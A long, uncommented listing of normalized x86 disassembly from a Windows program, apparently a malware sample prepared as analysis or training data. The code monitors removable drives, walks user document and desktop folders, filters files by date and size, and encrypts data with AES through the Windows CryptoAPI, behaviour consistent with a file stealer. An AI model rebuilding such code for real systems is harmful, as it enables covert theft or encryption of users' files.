cmp eax ebx
jne r-xdata
call sub_405c10
cmp al bl
jne r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
push ebx
push eax
push sub_408571
push 0x10000
push ebx
mov [ eax ] esi
call [ CreateThread@IAT ]
cmp eax ebx
je r-xdata
push ebx
call [ ExitProcess@IAT ]
xor eax eax
pop ebx
leave
retn
cmp eax 0xffffffff
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_40878f
push esi
mov esi eax
imul esi esi 0xa0
xor eax eax
cmp [ esi + rw-data ] eax
jne r-xdata
pop esi
retn
cmp [ esi + rw-data ] eax
je r-xdata
lea ecx [ esi + rw-data ]
push ecx
push 0x1
push eax
call [ CreateMutexW@IAT ]
push [ esi + rw-data ]
mov [ esi + rw-data ] eax
call [ CloseHandle@IAT ]
push [ esi + rw-data ]
call [ UnregisterDeviceNotification@IAT ]
sub_4087da
mov eax [ edi + 0x4 ]
dec eax
dec eax
push esi
je r-xdata
xor esi esi
sub eax 0x4
jne r-xdata
inc esi
cmp esi 0x1a
jl r-xdata
mov eax esi
call sub_40878f
pop esi
retn
push ebx
xor ebx ebx
mov esi rw-data
mov eax [ edi + 0xc ]
mov ecx esi
shr eax cl
test al 0x1
je r-xdata
add esi 0xa0
inc ebx
cmp esi rw-data
jl r-xdata
mov eax ebx
call sub_40878f
mov eax [ edi + 0xc ]
cmp eax [ esi ]
jne r-xdata
pop ebx
pop esi
retn
sub_40882b
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub eax 0x10
push esi
push edi
mov edi [ ebp + 0x14 ]
je r-xdata
push [ rw-data ]
call [ UnregisterDeviceNotification@IAT ]
push [ rw-data ]
call [ CloseHandle@IAT ]
xor esi esi
dec eax
dec eax
je r-xdata
mov eax esi
call sub_40878f
inc esi
cmp esi 0x1a
jl r-xdata
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ DefWindowProcW@IAT ]
pop edi
pop esi
pop ebp
retn 0x10
push 0x0
call [ PostQuitMessage@IAT ]
jmp r-xdata
sub eax 0x207
jne r-xdata
mov eax [ ebp + 0x10 ]
sub eax 0x8000
je r-xdata
cmp [ edi + 0x4 ] 0x2
jne r-xdata
dec eax
je r-xdata
xor esi esi
call sub_4087da
jmp r-xdata
sub eax 0x3
jne r-xdata
inc esi
cmp esi 0x1a
jl r-xdata
push [ ebp + 0x8 ]
call sub_408715
pop ecx
mov eax [ edi + 0xc ]
mov ecx esi
shr eax cl
test al 0x1
je r-xdata
jmp r-xdata
sub_4088ca
push ebp
mov ebp esp
sub esp 0x54
push ebx
push esi
push edi
push 0x30
pop ebx
push ebx
mov edi eax
xor esi esi
lea eax [ ebp - 0x50 ]
push esi
push eax
call sub_4130d0
mov eax [ edi + 0x5804 ]
mov [ ebp - 0x3c ] eax
add esp 0xc
mov [ ebp - 0x50 ] ebx
lea eax [ ebp - 0x50 ]
mov ebx r--data
push eax
mov [ ebp - 0x4c ] 0x4000
mov [ ebp - 0x48 ] sub_40882b
mov [ ebp - 0x44 ] esi
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x2c ] r--data
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] esi
call [ RegisterClassExW@IAT ]
mov edi [ edi + 0x5804 ]
push esi
push edi
push esi
push esi
mov eax 0xc8
push eax
push eax
push esi
push esi
mov edi 0x2000000
push edi
push r--data
push ebx
push esi
call [ CreateWindowExW@IAT ]
push edi
mov edi [ SetWindowLongW@IAT ]
push 0xfffffff0
push eax
mov [ rw-data ] eax
call edi
push 0x8000000
push 0xffffffec
push [ rw-data ]
call edi
push esi
push [ rw-data ]
call [ ShowWindow@IAT ]
push 0x20
pop edi
push edi
lea eax [ ebp - 0x20 ]
push esi
push eax
call sub_4130d0
add esp 0xc
push 0x10
lea eax [ ebp - 0x14 ]
push r--data
push eax
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x1c ] 0x5
call sub_412d60
add esp 0xc
push esi
lea eax [ ebp - 0x20 ]
push eax
push [ rw-data ]
call [ RegisterDeviceNotificationW@IAT ]
mov [ rw-data ] eax
pop edi
cmp eax esi
pop esi
setne al
pop ebx
leave
retn
sub_4089ce
push ebp
mov ebp esp
sub esp 0x46c
mov eax [ r--data ]
push ebx
push esi
push edi
mov [ ebp - 0x10 ] eax
mov eax [ r--data ]
mov [ ebp - 0xc ] eax
xor eax eax
lea edi [ ebp - 0x8 ]
stosd [ edi ]
stosd [ edi ]
push 0xc
pop ecx
mov esi r--data
lea edi [ ebp - 0x44 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
xor ebx ebx
mov edi 0x105
inc ebx
cmp ebx 0x18
jb r-xdata
push edi
lea eax [ ebp - 0x468 ]
push eax
xor eax eax
push eax
push eax
push eax
push edi
lea eax [ ebp - 0x258 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call [ GetVolumeInformationW@IAT ]
test eax eax
je r-xdata
movzx esi [ ebp + ebx * 2 - 0x44 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] si
call [ GetDriveTypeW@IAT ]
cmp eax 0x2
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
push r--data
lea eax [ ebp - 0x258 ]
push eax
call [ lstrcmpiW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
add esi 0xffffffbf
mov eax esi
imul eax eax 0xa0
add eax rw-data
push eax
call [ lstrcpyW@IAT ]
push [ rw-data ]
call sub_408715
pop ecx
sub_408a8a
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41decc
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x58
push ebx
push esi
push edi
lea esi [ esp + 0x10 ]
call sub_405d11
xor ebx ebx
mov [ esp + 0x6c ] ebx
lea eax [ esp + 0x3c ]
push eax
call sub_401108
mov [ esp + 0x6c ] 0x1
call sub_4046cc
push rw-data
push r--data
call sub_408b9c
call sub_4046cc
push rw-data
push r--data
call sub_408b9c
call sub_4046cc
push rw-data
push r--data
call sub_408b9c
push 0x10e0
push ebx
push rw-data
call sub_4130d0
mov eax [ ebp + 0x8 ]
add esp 0xc
call sub_4088ca
test al al
je r-xdata
mov [ esp + 0x6c ] bl
lea eax [ esp + 0x3c ]
push eax
call sub_40114f
or [ esp + 0x6c ] 0xffffffff
lea esi [ esp + 0x10 ]
call sub_405f2c
mov ecx [ esp + 0x64 ]
pop edi
pop esi
mov al 0x1
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
call sub_4089ce
mov edi [ PeekMessageW@IAT ]
mov esi [ Sleep@IAT ]
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
lea eax [ esp + 0x30 ]
push eax
call edi
test eax eax
je r-xdata
push 0xa
call esi
push ebx
call esi
push ebx
push ebx
push ebx
lea eax [ esp + 0x2c ]
push eax
call [ GetMessageW@IAT ]
test eax eax
je r-xdata
lea eax [ esp + 0x20 ]
push eax
call [ DispatchMessageW@IAT ]
jmp r-xdata
sub_408b9c
push ebp
mov ebp esp
sub esp 0x214
push ebx
mov ebx [ lstrlenW@IAT ]
push esi
push edi
push [ ebp + 0x8 ]
xor esi esi
call ebx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x210 ] ax
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x4 ] esi
jbe r-xdata
xor eax eax
mov [ ebp + esi * 2 - 0x210 ] ax
lea eax [ ebp - 0x210 ]
push eax
call ebx
test eax eax
jle r-xdata
mov ecx [ ebp + 0x8 ]
movzx eax [ ecx + eax * 2 ]
cmp eax 0x3b
jne r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
leave
retn 0x8
call sub_4046cc
lea edi [ ebp - 0x210 ]
call sub_403fca
mov ecx [ ebp + 0xc ]
push eax
call sub_406161
mov [ ebp + esi * 2 - 0x210 ] ax
inc esi
xor eax eax
mov [ ebp + esi * 2 - 0x210 ] ax
call sub_4046cc
lea edi [ ebp - 0x210 ]
call sub_403fca
mov ecx [ ebp + 0xc ]
push eax
call sub_406161
xor eax eax
mov [ ebp - 0x210 ] ax
xor esi esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
cmp eax [ ebp - 0x4 ]
jb r-xdata
sub_408c53
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub esp 0x194
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
xor al al
mov [ eax ] ebx
call sub_4046cc
push r--data
push [ ebp + 0x8 ]
call sub_403ba4
test al al
je r-xdata
call sub_4046cc
cmp [ ebp + 0x8 ] ebx
je r-xdata
push ebx
push [ ebp + 0x8 ]
call sub_4047b2
mov esi eax
mov [ ebp - 0x8 ] esi
cmp esi 0xffffffff
je r-xdata
call sub_4046cc
mov edi [ ReadFile@IAT ]
lea eax [ ebp - 0x88 ]
mov [ ebp - 0x1c ] ebx
test eax eax
je r-xdata
cmp [ ebp - 0x88 ] 0x4c
jne r-xdata
push ebx
lea eax [ ebp - 0x1c ]
push eax
push 0x4c
lea eax [ ebp - 0x88 ]
push eax
push esi
call edi
call sub_4046cc
push [ ebp - 0x8 ]
call [ CloseHandle@IAT ]
mov al 0x1
jmp r-xdata
push 0x10
lea eax [ ebp - 0x84 ]
push r--data
push eax
call sub_413944
add esp 0xc
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test [ ebp - 0x74 ] 0x1
je r-xdata
test [ ebp - 0x74 ] 0x2
je r-xdata
call sub_4046cc
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] ebx
test eax eax
je r-xdata
call sub_4046cc
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x18 ] ebx
test eax eax
je r-xdata
movzx esi [ ebp - 0x4 ]
sub esi 0x2
call sub_4046cc
push 0x1
push ebx
push esi
push [ ebp - 0x8 ]
call [ SetFilePointer@IAT ]
call sub_4046cc
lea eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] ebx
test eax eax
je r-xdata
push ebx
lea eax [ ebp - 0x14 ]
push eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push esi
call edi
mov eax 0x2800
cmp [ ebp - 0x34 ] eax
jae r-xdata
push ebx
lea eax [ ebp - 0x18 ]
push eax
push 0x1c
lea eax [ ebp - 0x38 ]
push eax
push [ ebp - 0x8 ]
call edi
push ebx
lea eax [ ebp - 0xc ]
push eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0x8 ]
call edi
cmp [ ebp - 0x38 ] eax
jae r-xdata
test [ ebp - 0x30 ] 0x1
je r-xdata
mov esi [ ebp - 0x28 ]
add esi 0xffffffe4
call sub_4046cc
push 0x1
push ebx
push esi
push [ ebp - 0x8 ]
call [ SetFilePointer@IAT ]
mov esi 0x104
mov ecx esi
lea eax [ ebp - 0x190 ]
mov [ eax ] bl
inc eax
dec ecx
jne r-xdata
call sub_4046cc
lea eax [ ebp - 0x190 ]
mov [ ebp - 0x10 ] ebx
test eax eax
je r-xdata
lea eax [ ebp - 0x190 ]
push eax
mov [ ebp - 0x8d ] bl
call [ lstrlenA@IAT ]
mov esi eax
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
push esi
lea eax [ ebp - 0x190 ]
push eax
push [ ebp - 0x8 ]
call edi
cmp [ ebp + esi - 0x190 ] 0x5c
jne r-xdata
mov al [ ebp + esi - 0x190 ]
cmp al 0x2f
je r-xdata
cmp esi 0x1
jle r-xdata
cmp al 0x3a
je r-xdata
mov [ ebp + esi - 0x190 ] bl
call sub_4046cc
push ebx
lea eax [ ebp - 0x190 ]
push eax
mov ebx esi
call sub_403ebc
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
cmp esi 0x1
jle r-xdata
dec esi
sub_408e69
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
mov esi eax
cmp [ esi + 0x1c ] 0x0
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
jne r-xdata
xor al al
cmp [ esi + 0x20 ] 0x1e00000
ja r-xdata
mov ebx [ FileTimeToSystemTime@IAT ]
lea eax [ ebp - 0x18 ]
push eax
lea eax [ esi + 0x4 ]
push eax
call ebx
mov eax 0x7dd
cmp [ ebp - 0x18 ] ax
jb r-xdata
lea eax [ ebp - 0x18 ]
push eax
lea eax [ esi + 0x14 ]
push eax
call ebx
mov eax 0x7dd
cmp [ ebp - 0x18 ] ax
jb r-xdata
lea ebx [ esi + 0x2c ]
push rw-data
push ebx
call sub_407f19
pop ecx
pop ecx
test al al
jne r-xdata
push rw-data
push ebx
call sub_407f19
pop ecx
pop ecx
test al al
je r-xdata
push 0x1
push [ ebp + 0x8 ]
mov eax esi
call sub_407e71
mov esi [ Sleep@IAT ]
pop ecx
pop ecx
push 0xa
mov [ edi ] eax
call esi
push 0x0
call esi
push [ edi ]
mov eax rw-data
call sub_401839
push 0xa
mov ebx eax
call esi
push 0x0
call esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + ebx * 4 ]
cmp eax [ edi ]
je r-xdata
mov al 0x1
jmp r-xdata
pop esi
pop ebx
leave
retn
sub_408f2f
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
xor bl bl
call sub_408c53
pop ecx
pop ecx
test al al
je r-xdata
pop edi
pop esi
mov al bl
pop ebx
leave
retn
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
mov bl 0x1
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
shr esi 0x2
xor edi edi
test esi esi
jle r-xdata
push rw-data
push ebx
call sub_407f19
pop ecx
pop ecx
test al al
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push ebx
push [ eax + edi * 4 ]
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
push ebx
call sub_406161
call sub_4046cc
push ebx
call sub_405c44
jmp r-xdata
inc edi
cmp edi esi
jl r-xdata
sub_408fcb
push ebp
mov ebp esp
sub esp 0x218
push ebx
push esi
push edi
push [ ebp + 0x8 ]
mov esi eax
lea eax [ ebp - 0x214 ]
push eax
call [ lstrcpyW@IAT ]
mov edi [ lstrcatW@IAT ]
push r--data
lea eax [ ebp - 0x214 ]
push eax
call edi
lea ebx [ esi + 0x2c ]
push ebx
lea eax [ ebp - 0x214 ]
push eax
call edi
test [ esi ] 0x10
jne r-xdata
mov esi [ lstrcmpW@IAT ]
push r--data
push ebx
call esi
test eax eax
je r-xdata
lea eax [ ebp - 0x214 ]
push eax
call sub_408f2f
pop ecx
test al al
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
push r--data
push ebx
call esi
test eax eax
je r-xdata
call sub_4046cc
call sub_403925
mov esi eax
sub eax [ rw-data ]
cmp eax 0x12c
jbe r-xdata
call sub_4046cc
push [ ebp + 0x8 ]
lea edi [ ebp - 0x8 ]
mov eax esi
call sub_408e69
pop ecx
test al al
je r-xdata
lea eax [ ebp - 0x214 ]
push rw-data
push eax
call sub_407f19
pop ecx
pop ecx
test al al
jne r-xdata
mov ecx [ rw-data ]
mov edx rw-data
call sub_406e3e
mov [ rw-data ] esi
jmp r-xdata
xor eax eax
push eax
push eax
push eax
push esi
lea eax [ ebp - 0x214 ]
push eax
push 0x70243102
push 0x70243101
call sub_4046cc
push eax
call sub_40541b
test al al
je r-xdata
call sub_4046cc
lea edi [ ebp - 0x214 ]
call sub_403fca
mov ecx [ rw-data ]
push eax
call sub_406161
call sub_4046cc
mov ebx [ ebp - 0x8 ]
mov eax rw-data
call sub_401872
mov edi [ Sleep@IAT ]
push 0xa
call edi
push 0x0
call edi
mov eax [ rw-data ]
add eax [ esi + 0x20 ]
inc [ rw-data ]
cmp [ rw-data ] 0x1b58
mov [ rw-data ] eax
ja r-xdata
call sub_4046cc
push eax
mov eax 0x708
call sub_403b4d
call sub_408fb0
cmp eax 0xc800000
jbe r-xdata
sub_40914b
push ebp
mov ebp esp
sub esp 0x45c
push esi
push edi
push [ ebp + 0x8 ]
call [ GetDriveTypeW@IAT ]
cmp eax 0x1
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x20c ]
push eax
call [ lstrcpyW@IAT ]
push r--data
lea eax [ ebp - 0x20c ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x45c ]
push eax
lea eax [ ebp - 0x20c ]
push eax
call [ FindFirstFileW@IAT ]
mov esi [ Sleep@IAT ]
push 0xa
mov edi eax
call esi
push 0x0
call esi
cmp edi 0xffffffff
je r-xdata
cmp eax 0x4
je r-xdata
xor al al
jmp r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x45c ]
call sub_408fcb
pop ecx
push 0xa
call esi
push 0x0
call esi
lea eax [ ebp - 0x45c ]
push eax
push edi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
cmp eax 0x3
je r-xdata
pop edi
pop esi
leave
retn
push edi
call [ FindClose@IAT ]
mov al 0x1
test eax eax
je r-xdata
sub_409210
mov eax sub_41dd22
call sub_4198ec
sub esp 0x468
push ebx
push esi
push edi
lea esi [ ebp - 0x30 ]
call sub_405d11
mov [ ebp - 0x4 ] 0x1
call sub_4046cc
mov eax esi
push eax
push r--data
call sub_408b9c
mov esi [ ebp - 0x2c ]
xor ebx ebx
shr esi 0x2
mov [ ebp - 0x14 ] ebx
cmp esi ebx
jle r-xdata
mov esi [ SHGetFolderPathW@IAT ]
lea eax [ ebp - 0x26c ]
push eax
push ebx
push ebx
push 0x8
push ebx
call esi
test eax eax
jne r-xdata
mov ecx [ ebp - 0x14 ]
push 0x104
lea eax [ ebp - 0x474 ]
push eax
mov eax [ ebp - 0x30 ]
push [ eax + ecx * 4 ]
call [ ExpandEnvironmentStringsW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x26c ]
push eax
push ebx
push ebx
push 0x1c
push ebx
call esi
test eax eax
jne r-xdata
lea edi [ ebp - 0x26c ]
call sub_4091f7
inc [ ebp - 0x14 ]
cmp [ ebp - 0x14 ] esi
jl r-xdata
call sub_4046cc
lea edi [ ebp - 0x474 ]
call sub_403fca
mov ecx [ rw-data ]
push eax
call sub_406161
lea eax [ ebp - 0x26c ]
push eax
push ebx
push ebx
push 0x5
push ebx
call esi
test eax eax
jne r-xdata
lea edi [ ebp - 0x26c ]
call sub_4091f7
lea eax [ ebp - 0x26c ]
push eax
push ebx
push ebx
push 0x10
push ebx
call esi
test eax eax
jne r-xdata
lea edi [ ebp - 0x26c ]
call sub_4091f7
lea eax [ ebp - 0x26c ]
push eax
push ebx
push ebx
push 0x2e
push ebx
call esi
test eax eax
jne r-xdata
lea edi [ ebp - 0x26c ]
call sub_4091f7
lea eax [ ebp - 0x26c ]
push eax
push ebx
push ebx
push 0x19
push ebx
call esi
test eax eax
jne r-xdata
lea edi [ ebp - 0x26c ]
call sub_4091f7
mov eax [ r--data ]
mov [ ebp - 0x20 ] eax
mov eax [ r--data ]
mov [ ebp - 0x1c ] eax
xor eax eax
lea edi [ ebp - 0x18 ]
stosw [ edi ]
push 0xc
pop ecx
mov esi r--data
lea edi [ ebp - 0x64 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
lea edi [ ebp - 0x26c ]
call sub_4091f7
mov ax [ ebp + ebx * 2 - 0x64 ]
mov [ ebp - 0x20 ] ax
call sub_4046cc
lea edi [ ebp - 0x20 ]
call sub_403fca
mov ecx [ rw-data ]
push eax
call sub_406161
inc ebx
cmp ebx 0x18
jb r-xdata
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp - 0x30 ]
push eax
call sub_406650
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x30 ]
call sub_405f2c
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
sub_4093c3
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41de38
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x294
push ebx
push esi
push 0xffffffff
push [ ebp + 0x8 ]
mov eax 0x70243101
lea ecx [ esp + 0x40 ]
call sub_406b4c
and [ esp + 0x2a4 ] 0x0
lea esi [ esp + 0x8 ]
call sub_405d11
mov [ esp + 0x2a4 ] 0x1
lea esi [ esp + 0x18 ]
call sub_405d11
mov [ esp + 0x2a4 ] 0x3
lea esi [ esp + 0x28 ]
call sub_405d11
mov [ esp + 0x2a4 ] 0x5
jmp r-xdata
lea esi [ esp + 0x38 ]
call sub_406c79
test al al
je r-xdata
push [ ebp + 0x8 ]
push 0x3c
pop eax
call sub_403b4d
lea eax [ esp + 0x18 ]
mov [ rw-data ] eax
lea eax [ esp + 0x28 ]
mov [ rw-data ] eax
mov eax esi
mov [ rw-data ] eax
call sub_4046cc
push rw-data
push r--data
call sub_408b9c
call sub_4046cc
push rw-data
push r--data
call sub_408b9c
call sub_4046cc
push rw-data
push r--data
call sub_408b9c
call sub_408fb0
lea eax [ esp + 0x8 ]
mov ebx esi
call sub_406f26
push rw-data
lea eax [ esp + 0xc ]
call sub_4018da
lea esi [ esp + 0x8 ]
call sub_405f3e
mov esi [ Sleep@IAT ]
mov ecx [ rw-data ]
cmp [ ecx + 0x4 ] 0x0
je r-xdata
mov eax [ eax ]
push [ eax + ebx * 4 ]
call sub_40914b
mov eax [ rw-data ]
pop ecx
mov ecx [ eax + 0x4 ]
inc ebx
shr ecx 0x2
cmp ebx ecx
jl r-xdata
mov edx rw-data
lea ecx [ esp + 0x38 ]
call sub_406e3e
push [ ebp + 0x8 ]
mov eax 0xe10
call sub_403b4d
jmp r-xdata
push eax
mov [ rw-data ] eax
mov [ rw-data ] ecx
call sub_406650
push 0xa
call esi
push 0x0
call esi
jmp r-xdata
call sub_409210
mov eax [ rw-data ]
mov ecx [ eax + 0x4 ]
shr ecx 0x2
xor ebx ebx
test ecx ecx
jle r-xdata
sub_409545
push edi
mov edi [ esi ]
call sub_4046cc
push ebx
mov eax esi
call sub_401839
mov ecx [ esi + 0x4 ]
shr ecx 0x2
cmp eax ecx
jge r-xdata
mov al 0x1
pop edi
retn
xor ecx ecx
cmp [ edi + eax * 4 ] ebx
setne al
pop edi
retn
sub_40956d
push edi
xor eax eax
push eax
push eax
push 0x2e
push eax
call [ SHGetFolderPathW@IAT ]
test eax eax
je r-xdata
push esi
mov esi [ PathRemoveFileSpecW@IAT ]
push edi
call esi
push edi
call esi
mov al 0x1
pop esi
retn
xor al al
retn
sub_409593
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
push edi
push 0x20
pop edi
mov ecx 0x200
mov eax edx
xor ebx ebx
mov [ eax ] bl
inc eax
dec ecx
jne r-xdata
mov esi [ CryptHashData@IAT ]
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] edx
push [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
push eax
push [ ebp - 0x10 ]
call sub_413290
sub edi [ ebp - 0x4 ]
add esp 0xc
push [ ebp - 0x8 ]
call [ CryptDestroyHash@IAT ]
inc [ ebp - 0xc ]
add [ ebp - 0x10 ] 0x14
cmp edi ebx
ja r-xdata
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
push 0x8004
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x14
call [ CryptCreateHash@IAT ]
mov eax [ ebp - 0xc ]
mov ecx eax
mov edx eax
shr edx 0x10
and ecx 0xff0000
or ecx edx
mov edx eax
and edx 0xff00
shl eax 0x10
push ebx
or edx eax
push 0x4
lea eax [ ebp - 0x14 ]
shr ecx 0x8
shl edx 0x8
push eax
push [ ebp - 0x8 ]
or ecx edx
mov [ ebp - 0x14 ] ecx
call esi
mov eax [ ebp + 0xc ]
push ebx
push [ eax ]
push [ eax + 0x4 ]
push [ ebp - 0x8 ]
call esi
push ebx
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
push 0x2
push [ ebp - 0x8 ]
call [ CryptGetHashParam@IAT ]
cmp edi [ ebp - 0x4 ]
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_409667
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
push edi
mov esi r--data
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx [ lstrlenA@IAT ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi r--data
lea edi [ ebp - 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x18 ]
push eax
movsd [ edi ] [ esi ]
call ebx
mov edi [ ebp + 0xc ]
mov esi eax
mov eax [ ebp + 0xc ]
and [ eax ] 0x0
mov [ ebp - 0x4 ] 0x3
mov [ ebp + esi - 0x29 ] 0x3e
mov [ ebp + esi - 0x1a ] 0x3e
mov [ ebp + esi - 0x28 ] 0x0
mov [ ebp + esi - 0x19 ] 0x0
add al 0x30
mov [ ebp + esi - 0x1a ] al
mov [ ebp + esi - 0x29 ] al
jmp r-xdata
dec [ ebp - 0x4 ]
jne r-xdata
lea ecx [ ebp - 0x28 ]
push ecx
push eax
call [ StrStrA@IAT ]
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0x8 ]
call [ StrStrA@IAT ]
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp eax 0x1
jbe r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
cmp eax [ ecx ]
jbe r-xdata
lea eax [ ebp - 0x18 ]
push eax
call ebx
add eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
sub edi eax
mov [ ecx ] eax
jns r-xdata
xor al al
jmp r-xdata
mov eax edi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov al 0x1
sub_409732
push ebp
mov ebp esp
sub esp 0x30
and [ esi ] 0x0
push 0x20
pop eax
push eax
push [ ebp + 0xc ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x30 ] 0x208
mov [ ebp - 0x2c ] 0x6610
call sub_413290
add esp 0xc
push esi
push 0x0
push 0x0
push 0x2c
lea eax [ ebp - 0x30 ]
push eax
push [ ebp + 0x8 ]
call [ CryptImportKey@IAT ]
test eax eax
jne r-xdata
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x4
push [ esi ]
call [ CryptSetKeyParam@IAT ]
test eax eax
setne al
leave
retn
xor al al
leave
retn
sub_4097be
push esi
mov esi eax
mov eax [ esi + 0x8 ]
push edi
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
mov edi [ CloseHandle@IAT ]
test eax eax
je r-xdata
push eax
call [ UnmapViewOfFile@IAT ]
mov esi [ esi ]
test esi esi
je r-xdata
push eax
call edi
pop edi
pop esi
retn
cmp esi 0xffffffff
je r-xdata
push esi
call edi
sub_4097f1
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
push edi
mov edi eax
cmp [ ebp + 0xc ] ebx
jne r-xdata
push esi
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] ebx
cmp [ ebp + 0x8 ] ebx
jbe r-xdata
xor al al
jmp r-xdata
mov al 0x1
push 0x10
pop esi
mov [ ebp - 0x8 ] esi
sub [ ebp - 0x8 ] edi
pop edi
pop ebx
leave
retn
xor al al
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
add eax edi
cmp eax ecx
jae r-xdata
pop esi
sub ecx [ ebp - 0x4 ]
mov ecx esi
jmp r-xdata
add [ ebp - 0x4 ] esi
mov eax [ ebp - 0x4 ]
add edi esi
inc [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jb r-xdata
mov dl [ ebp + eax - 0x20 ]
xor [ edi + eax ] dl
inc eax
cmp eax ecx
jb r-xdata
xor eax eax
cmp ecx ebx
jbe r-xdata
mov eax [ ebp - 0xc ]
mov ecx eax
mov edx eax
shr edx 0x10
and ecx 0xff0000
or ecx edx
mov edx eax
shl eax 0x10
push esi
and edx 0xff00
or edx eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push ebx
push ebx
shr ecx 0x8
shl edx 0x8
push ebx
push [ ebp + 0xc ]
or ecx edx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ecx
call [ CryptEncrypt@IAT ]
test eax eax
je r-xdata
xor ebx ebx
sub_4098b7
push ebp
mov ebp esp
sub esp 0x20c
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
mov eax edi
call sub_407e71
pop ecx
pop ecx
mov ebx eax
mov esi rw-data
call sub_409545
test al al
je r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
leave
retn
push [ ebp + 0xc ]
lea eax [ ebp - 0x208 ]
push eax
call [ lstrcpyW@IAT ]
lea eax [ ebp - 0x208 ]
push eax
call [ PathAddBackslashW@IAT ]
lea eax [ edi + 0x2c ]
push eax
lea eax [ ebp - 0x208 ]
push eax
